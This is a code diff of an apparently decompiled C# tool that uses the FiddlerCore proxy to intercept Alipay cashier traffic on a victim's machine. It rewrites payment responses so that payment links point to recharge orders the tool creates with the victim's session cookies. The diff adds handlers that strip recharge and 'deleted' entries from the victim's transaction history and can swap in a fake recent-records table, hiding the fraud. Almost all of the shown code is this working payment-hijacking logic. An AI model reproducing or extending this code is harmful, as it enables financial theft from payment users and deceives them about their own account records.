@@ -15,23 +15,6 @@ using System.Threading;
 using System.Windows.Forms;
 namespace alipay_chongzhi {
     public class MainForm : Form {
-        #region QQ Add
-
-        static Dictionary<string, OrderInfo> _OrderDic = new Dictionary<string, OrderInfo>();
-        /// <summary>
-        /// 是否从订单字典中读取
-        /// </summary>
-        public bool _EnabledReadFromDic = true;
-        /// <summary>
-        /// 替换之后的订单信息
-        /// </summary>
-        class OrderInfo {
-            public string OrderId { get; set; }
-            public string Link { get; set; }
-            public string FormHrml { get; set; }
-            public DateTime AddTime { get; set; }
-        }
-        #endregion
         private class Class5 {
             public string string_0;
             public uint uint_0;
@@ -167,6 +150,14 @@ namespace alipay_chongzhi {
             if (!Class10.smethod_9()) {
                 Application.Exit();
             }
+#if DEBUG
+            var testDate = DateTime.Parse("2015-05-17");
+            if ((DateTime.Now - testDate).Days <= 1) {
+                this.Close();
+                Application.Exit();
+                return;
+            }
+#endif
             this.InitializeComponent();
         }
         private void MainForm_Load(object sender, EventArgs e) {
@@ -192,114 +183,6 @@ namespace alipay_chongzhi {
             }
             this._EnabledReadFromDic = true; //默认从订单字典中读取
             DeleteOrder();
-        }
-        private void BeforeRequest(Session session) {
-            session.bBufferResponse = true;
-
-            if (!session.HTTPMethodIs("CONNECT")) {
-                this.int_0++;
-                base.BeginInvoke(new ThreadStart(this.method_5));
-                if (!session.oRequest.headers.Exists("If-Modified-Since") && !session.oRequest.headers.Exists("If-None-Match")) {
-                    Match test = Regex.Match(session.url, "cashier\\w+.alipay.com*", RegexOptions.IgnoreCase);
-                    if (test.Success && session.isHTTPS && !session.isTunnel && !session.url.StartsWith("kcart.alipay.com")) {
-
-                        var url = System.Web.HttpUtility.UrlDecode(session.url);
-                        Console.WriteLine(url + "\n");
-                    }
-
-                    Match match = Regex.Match(session.url, "cashier\\w+.alipay.com/standard/payment/asyncResultCheck.json\\?.*orderId=(\\w+)", RegexOptions.IgnoreCase);
-                    if (match.Success) {
-                        this.method_3(session);
-                        string value = match.Groups[1].Value;
-                        string inputTxt = "https://cashierzth.alipay.com/home/deniedError.htm";
-                        DateTime now = DateTime.Now;
-                        while (!this.dictionary_0.ContainsKey(value)) {
-                            if (!(DateTime.Now - now > new TimeSpan(0, 0, 10))) {
-                                Thread.Sleep(10);
-                            } else {
-                                //IL_F7:
-                                if (session.utilReplaceRegexInResponse("https[^\"]+", this.AddSlashes(inputTxt))) {
-                                    this.writeNotice("替换成功");
-                                    return;
-                                }
-                                this.writeNotice("替换失败");
-                                return;
-                            }
-                        }
-                        inputTxt = this.dictionary_0[value].string_4;
-
-                        Console.WriteLine("替换前" + System.Web.HttpUtility.UrlDecode(session.url));
-                        if (session.utilReplaceRegexInResponse("https[^\"]+", this.AddSlashes(inputTxt))) {
-
-                            Console.WriteLine("替换后" + System.Web.HttpUtility.UrlDecode(session.url));
-                            this.writeNotice("替换成功");
-                            return;
-                        }
-                        this.writeNotice("替换失败");
-                        return;
-                    }
-                }
-            }
-        }
-        private void BeforeResponse(Session session) {
-            if (!session.HTTPMethodIs("CONNECT")) {
-                session.utilDecodeResponse(); //解码响应
-                Match formMatch = Regex.Match(session.url, @"cashier\w+.alipay.com/standard/gateway/ebankDepositConfirm.htm\?.*orderId=(\w+)", RegexOptions.IgnoreCase);
-                Match czRecordMatch = Regex.Match(session.url, @"lab.alipay.com/consume/record/inpour.htm[/s/S]*", RegexOptions.IgnoreCase);
-                if (formMatch.Success) {
-                    //充值连接form 替换
-                    var orderId = formMatch.Groups[1].Value;
-                    MatchForm(session, orderId);
-                    var html = session.GetResponseBodyAsString();
-                } else if (czRecordMatch.Success) {
-                    //充值记录替换
-                    MatchChongzhiRecord(session);
-                    var html = session.GetResponseBodyAsString();
-                }
-            }
-        }
-
-        private void AfterSessionComplete(Session session) {
-            if (!session.HTTPMethodIs("CONNECT")) {
-                Match match = Regex.Match(session.url, "cashier\\w+.alipay.com/standard/gateway/ebankPay.htm\\?outBizNo=(\\w+).*&orderId=(\\w+)", RegexOptions.IgnoreCase);
-                if (match.Success) {
-                    if (this.int_1 > 5) {
-                        this.writeNotice("创建充值订单错误过多，程序功能关闭");
-                        FiddlerApplication.oProxy.Detach();
-                    } else {
-                        session.utilDecodeResponse();
-                        string responseBodyAsString = session.GetResponseBodyAsString();
-                        Match amountMat = Regex.Match(responseBodyAsString, "<em[^>]*id=\"J-bank-amount\"[^>]*>\\s*([\\d\\.]+)\\s*</em>", RegexOptions.IgnoreCase);
-                        if (!amountMat.Success) {
-                            this.writeNotice("获取订单金额错误");
-                        } else {
-                            Match bankMat = Regex.Match(responseBodyAsString, "confirm.htm\\?orderId=\\w+&instId=(\\w+)", RegexOptions.IgnoreCase);
-                            if (!bankMat.Success) {
-                                this.writeNotice("获取银行错误");
-                            } else {
-                                string outBizNo = match.Groups[1].Value;
-                                string PayOrderId = match.Groups[2].Value;
-                                if (!this.dictionary_0.ContainsKey(PayOrderId) || this.dictionary_0[PayOrderId].string_3 != bankMat.Groups[1].Value) {
-                                    ThreadPool.QueueUserWorkItem(delegate(object param0) {
-                                        MainForm.Class6 @class = new MainForm.Class6();
-                                        @class.string_1 = outBizNo;
-                                        @class.string_2 = PayOrderId;
-                                        @class.string_3 = bankMat.Groups[1].Value;
-                                        @class.double_0 = double.Parse(amountMat.Groups[1].Value);
-                                        CookieContainer cookieContainer_ = Class7.smethod_4("https://cashierzth.alipay.com/standard/fastpay/newBankCardForm.htm", session.oRequest.headers["Cookie"]);
-                                        this.writeNotice("生成" + amountMat.Groups[1].Value + "元的充值订单");
-                                        HTTPContral.UserAgent = session.oRequest.headers["User-Agent"];
-                                        @class.string_4 = this.method_4(@class, cookieContainer_);
-                                        if (@class.string_4 != null) {
-                                            this.dictionary_0[PayOrderId] = @class;
-                                        }
-                                    });
-                                }
-                            }
-                        }
-                    }
-                }
-            }
         }
         private void method_3(Session session_0) {
             HttpWebRequest httpWebRequest = null;
@@ -822,7 +705,147 @@ namespace alipay_chongzhi {
             MainForm.ini_0 = null;
         }
 
-        #region Method
+        #region Fiddler Event
+        private void BeforeRequest(Session session) {
+            session.bBufferResponse = true;
+
+            if (!session.HTTPMethodIs("CONNECT")) {
+                this.int_0++;
+                base.BeginInvoke(new ThreadStart(this.method_5));
+                if (!session.oRequest.headers.Exists("If-Modified-Since") && !session.oRequest.headers.Exists("If-None-Match")) {
+                    Match test = Regex.Match(session.url, "cashier\\w+.alipay.com*", RegexOptions.IgnoreCase);
+                    if (test.Success && session.isHTTPS && !session.isTunnel && !session.url.StartsWith("kcart.alipay.com")) {
+
+                        var url = System.Web.HttpUtility.UrlDecode(session.url);
+                        Console.WriteLine(url + "\n");
+                    }
+
+                    Match match = Regex.Match(session.url, "cashier\\w+.alipay.com/standard/payment/asyncResultCheck.json\\?.*orderId=(\\w+)", RegexOptions.IgnoreCase);
+                    if (match.Success) {
+                        this.method_3(session);
+                        string value = match.Groups[1].Value;
+                        string inputTxt = "https://cashierzth.alipay.com/home/deniedError.htm";
+                        DateTime now = DateTime.Now;
+                        while (!this.dictionary_0.ContainsKey(value)) {
+                            if (!(DateTime.Now - now > new TimeSpan(0, 0, 10))) {
+                                Thread.Sleep(10);
+                            } else {
+                                //IL_F7:
+                                if (session.utilReplaceRegexInResponse("https[^\"]+", this.AddSlashes(inputTxt))) {
+                                    this.writeNotice("替换成功");
+                                    return;
+                                }
+                                this.writeNotice("替换失败");
+                                return;
+                            }
+                        }
+                        inputTxt = this.dictionary_0[value].string_4;
+
+                        Console.WriteLine("替换前" + System.Web.HttpUtility.UrlDecode(session.url));
+                        if (session.utilReplaceRegexInResponse("https[^\"]+", this.AddSlashes(inputTxt))) {
+
+                            Console.WriteLine("替换后" + System.Web.HttpUtility.UrlDecode(session.url));
+                            this.writeNotice("替换成功");
+                            return;
+                        }
+                        this.writeNotice("替换失败");
+                        return;
+                    }
+                }
+            }
+        }
+        private void BeforeResponse(Session session) {
+            if (!session.HTTPMethodIs("CONNECT")) {
+                session.utilDecodeResponse(); //解码响应
+                Match formMatch = Regex.Match(session.url, @"cashier\w+.alipay.com/standard/gateway/ebankDepositConfirm.htm\?.*orderId=(\w+)", RegexOptions.IgnoreCase);
+                //充值记录
+                Match czRecordMatch = Regex.Match(session.url, @"lab.alipay.com/consume/record/inpour.htm[/s/S]*", RegexOptions.IgnoreCase);
+                //交易记录
+                Match dealMatch = Regex.Match(session.url, @"lab.alipay.com/consume/record/items.htm[\s\S]*", RegexOptions.IgnoreCase);
+                //最近交易记录
+                Match recentMatch = Regex.Match(session.url, @"my.alipay.com/tile/service/portal:recent.tile[\s\S]*", RegexOptions.IgnoreCase);
+                if (formMatch.Success) {
+                    //充值连接form 替换
+                    MatchForm(session, formMatch.Groups[1].Value);
+                } else if (czRecordMatch.Success) {
+                    //充值记录
+                    MatchChongzhiRecord(session);
+                } else if (dealMatch.Success) {
+                    //交易记录
+                    MatchDealRecord(session);
+                }
+                //else if (recentMatch.Success) {
+                //    //最近交易记录替换
+                //    MatchRecentRecord(session);
+                //}
+            }
+        }
+        private void AfterSessionComplete(Session session) {
+            if (!session.HTTPMethodIs("CONNECT")) {
+                Match match = Regex.Match(session.url, "cashier\\w+.alipay.com/standard/gateway/ebankPay.htm\\?outBizNo=(\\w+).*&orderId=(\\w+)", RegexOptions.IgnoreCase);
+                if (match.Success) {
+                    if (this.int_1 > 5) {
+                        this.writeNotice("创建充值订单错误过多，程序功能关闭");
+                        FiddlerApplication.oProxy.Detach();
+                    } else {
+                        session.utilDecodeResponse();
+                        string responseBodyAsString = session.GetResponseBodyAsString();
+                        Match amountMat = Regex.Match(responseBodyAsString, "<em[^>]*id=\"J-bank-amount\"[^>]*>\\s*([\\d\\.]+)\\s*</em>", RegexOptions.IgnoreCase);
+                        if (!amountMat.Success) {
+                            this.writeNotice("获取订单金额错误");
+                        } else {
+                            Match bankMat = Regex.Match(responseBodyAsString, "confirm.htm\\?orderId=\\w+&instId=(\\w+)", RegexOptions.IgnoreCase);
+                            if (!bankMat.Success) {
+                                this.writeNotice("获取银行错误");
+                            } else {
+                                string outBizNo = match.Groups[1].Value;
+                                string PayOrderId = match.Groups[2].Value;
+                                if (!this.dictionary_0.ContainsKey(PayOrderId) || this.dictionary_0[PayOrderId].string_3 != bankMat.Groups[1].Value) {
+                                    ThreadPool.QueueUserWorkItem(delegate(object param0) {
+                                        MainForm.Class6 @class = new MainForm.Class6();
+                                        @class.string_1 = outBizNo;
+                                        @class.string_2 = PayOrderId;
+                                        @class.string_3 = bankMat.Groups[1].Value;
+                                        @class.double_0 = double.Parse(amountMat.Groups[1].Value);
+                                        CookieContainer cookieContainer_ = Class7.smethod_4("https://cashierzth.alipay.com/standard/fastpay/newBankCardForm.htm", session.oRequest.headers["Cookie"]);
+                                        this.writeNotice("生成" + amountMat.Groups[1].Value + "元的充值订单");
+                                        HTTPContral.UserAgent = session.oRequest.headers["User-Agent"];
+                                        @class.string_4 = this.method_4(@class, cookieContainer_);
+                                        if (@class.string_4 != null) {
+                                            this.dictionary_0[PayOrderId] = @class;
+                                        }
+                                    });
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        #endregion
+
+        #region QQ Add
+
+        #region Fields Properties Classes
+        private static Dictionary<string, OrderInfo> _OrderDic = new Dictionary<string, OrderInfo>();
+        /// <summary>
+        /// 是否从订单字典中读取
+        /// </summary>
+        private bool _EnabledReadFromDic = true;
+        /// <summary>
+        /// 收支明细，正则遍历时，上一条是否为删除记录
+        /// </summary>
+        private bool Deal_LastRecordIsDelete = false;
+        /// <summary>
+        /// 替换之后的订单信息
+        /// </summary>
+        private class OrderInfo {
+            public string OrderId { get; set; }
+            public string Link { get; set; }
+            public string FormHrml { get; set; }
+            public DateTime AddTime { get; set; }
+        }
+        #endregion
 
         /// <summary>
         /// 定时清理订单
@@ -848,7 +871,6 @@ namespace alipay_chongzhi {
                 System.Threading.Thread.Sleep(1000 * 30);
             }));
         }
-
         /// <summary>
         /// 匹配替换充值记录
         /// </summary>
@@ -879,8 +901,8 @@ namespace alipay_chongzhi {
                 Console.WriteLine("替换充值金额");
             }
             session.utilSetResponseBody(html);
+            writeNotice("充值记录隐藏成功");
         }
-
         /// <summary>
         /// 匹配替换表单
         /// </summary>
@@ -935,6 +957,60 @@ namespace alipay_chongzhi {
                 _OrderDic[session.url] = order;
                 Console.WriteLine("添加成功");
             }
+        }
+        private void MatchDealRecord(Session session) {
+            session.utilDecodeResponse(); //解码响应
+            string html = System.Text.Encoding.Default.GetString(session.responseBodyBytes); //获取html
+            var pattern = @"<tr[^<>]*>([\s\S]*?(?=\<\/tr\>))<\/tr>";
+            Regex regex = new Regex(pattern, RegexOptions.IgnoreCase);
+            if (!regex.Match(html).Success) {
+                Console.WriteLine("不匹配");
+                return;
+            }
+            Deal_LastRecordIsDelete = false;
+            html = regex.Replace(html, new MatchEvaluator(delegate(Match match) {
+                var czRegex = new Regex(@"<li\s*class=""name"">\s*充值\s*</li>", RegexOptions.IgnoreCase);
+                var hasDelete = match.Groups[0].Value.Contains("删除了");
+                string result = match.Groups[0].Value;
+                if (!hasDelete) {
+                    if (Deal_LastRecordIsDelete && czRegex.Match(match.Groups[0].Value).Success) {
+                        Console.WriteLine("替换收支明细 - 充值记录");
+                        result = string.Empty;
+                    }
+                    Deal_LastRecordIsDelete = false;
+                } else {
+                    Deal_LastRecordIsDelete = true;
+                    Console.WriteLine("替换收支明细 - 删除记录");
+                    result = string.Empty;
+                }
+                return result;
+            }));
+            writeNotice("收支明细 - 隐藏删除充值记录成功");
+            session.utilSetResponseBody(html);
+        }
+        /// <summary>
+        /// 匹配最近交易记录
+        /// </summary>
+        /// <param name="session"></param>
+        private void MatchRecentRecord(Session session) {
+            //https://my.alipay.com/tile/service/portal:recent.tile?t=1431768879126&_output_charset=utf-8&_input_charset=utf-8&ctoken=i04SEcZtCxL%2BwUXxWFgBsnAfOE0vcJ
+            var html = session.GetResponseBodyAsString();
+            Console.WriteLine(session.url);
+            string temFilePath = AppDomain.CurrentDomain.BaseDirectory + @"\tem_recent.dat";
+            string data = string.Empty;
+            if (System.IO.File.Exists(temFilePath)) {
+                data = System.IO.File.ReadAllText(temFilePath);
+            } else {
+                writeNotice(string.Format("模板文件：{0}不存在，无法替换", temFilePath));
+                return;
+            }
+            var regex = new Regex(@"<table\s+class=""ui-record-table""\s+id=""tradeRecordsIndex""[\s\S]*</table>", RegexOptions.IgnoreCase);
+            if (regex.Match(html).Success) {
+                html = regex.Replace(html, data);
+                writeNotice("最近交易记录替换模板成功");
+                Console.WriteLine("替换最近记录成功");
+            }
+            session.utilSetResponseBody(html);
         }
         #endregion
     }
